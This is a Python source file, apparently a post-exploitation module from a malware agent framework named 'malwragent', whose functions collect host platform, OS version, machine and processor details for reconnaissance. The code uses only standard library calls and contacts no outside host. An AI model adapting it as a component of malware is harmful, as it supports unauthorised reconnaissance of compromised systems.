# -*- coding: utf-8 -*-
"""the enumeration module provides methods for platform enumeration and reconnaissance"""
from __future__ import absolute_import

import platform

from malwragent.packages.helpers.agentmodule import AgentModule
from malwragent.packages.helpers.agentmodule import Decorators

__class_name__ = 'Enumeration'
__client_mode__ = True
__server_mode__ = False
__module_type__ = 'Post'


class Enumeration(AgentModule):
    """provide basic host enumeration routines"""

    @staticmethod
    @Decorators.config(run_first=True)
    def f_get_platform():
        """identify platform in very detail"""
        return platform.platform()

    @staticmethod
    @Decorators.config(run_first=True)
    def f_get_platform_version():
        """identify system's release version"""
        return platform.version()

    @staticmethod
    @Decorators.config(run_first=True)
    def f_get_platform_machine():
        """identify machine type"""
        return platform.machine()

    @staticmethod
    @Decorators.config(run_first=True)
    def f_get_platform_system():
        """identify OS name"""
        return platform.system()

    @staticmethod
    @Decorators.config(run_first=True)
    def f_get_platform_processor():
        """identify the processor name"""
        return platform.processor()

    @staticmethod
    @Decorators.args(None)  # can be applied to methods, not a must
    @Decorators.config(run_first=True)
    def f_get_platform_uname():
        """identify system, node, release, version, machine and processor"""
        return str(platform.uname())
